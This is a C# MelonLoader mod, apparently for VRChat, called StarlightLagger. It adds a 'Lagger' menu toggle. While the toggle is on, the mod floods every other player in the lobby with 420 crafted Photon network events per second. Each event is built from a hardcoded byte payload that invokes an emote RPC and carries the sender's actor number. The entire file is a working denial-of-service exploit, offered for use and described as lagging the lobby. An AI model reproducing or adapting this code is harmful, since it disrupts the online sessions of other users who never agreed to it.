using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Pun;
using Photon.Realtime;
using RubyButtonAPI;
using System;
using System.Collections;
using UnityEngine;

namespace StarlightLagger
{
    public class MainClass : MelonMod
    {
        public override void OnApplicationStart()
        {
            WhereDaUI().Start();
        }

        public override void OnUpdate()
        {
            if (invalidobject == true)
            {
                try
                {
                    Delay += Time.deltaTime;
                    if (Delay > 1f)
                    {
                        for (int i = 0; i < 420; i++)
                        {
                            byte[] bytes1 = new byte[] { 106, 243, 176, 179, 227, 1, 0, 0, 0, 7, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 12, 0, 80, 108, 97, 121, 69, 109, 111, 116, 101, 82, 80, 67, 0, 0, 0, 0, 4, 8, 0, 2, 10, 1, 0, 5, 7, 0, 0, 0 };
                            byte[] IDOut = BitConverter.GetBytes(PlayerExtensions.GetActorNumber(PlayerExtensions.LocalPlayer));
                            Buffer.BlockCopy(IDOut, 0, bytes1, 5, 4);
                            OpRaiseEvent(6, bytes1, new RaiseEventOptions
                            {
                                field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                                field_Public_EventCaching_0 = EventCaching.DoNotCache
                            }, default(SendOptions));
                        }
                        Delay = 0f;
                    }
                }
                catch { }
            }
        }

        public static void StarlightGUI()
        {
            sheeeeeesh = new QMToggleButton("ShortcutMenu", 0, 0, "Lagger", () =>
            {
                invalidobject = true;
            }, "OFF", () =>
            {
                invalidobject = false;
            }, "Lag the lobby with an exploit found by Stellar and Sypherr UwU", Color.black, Color.cyan, false, false); ;
        }

        public static bool invalidobject;
        internal static QMToggleButton sheeeeeesh;

        public static IEnumerator WhereDaUI()
        {
            while (VRCUiManager.prop_VRCUiManager_0 == null) yield return null;
            StarlightGUI();
            yield break;
        }

        public static void OpRaiseEvent(byte code, object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
        {
            Il2CppSystem.Object customObject2 = Serialization.FromManagedToIL2CPP<Il2CppSystem.Object>(customObject);
            OpRaiseEvent(code, customObject2, RaiseEventOptions, sendOptions);
        }

        public static void OpRaiseEvent(byte code, Il2CppSystem.Object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
        {
            PhotonNetwork.field_Public_Static_LoadBalancingClient_0.Method_Public_Virtual_New_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(code, customObject, RaiseEventOptions, sendOptions);
        }

        public static float Delay;
    }
}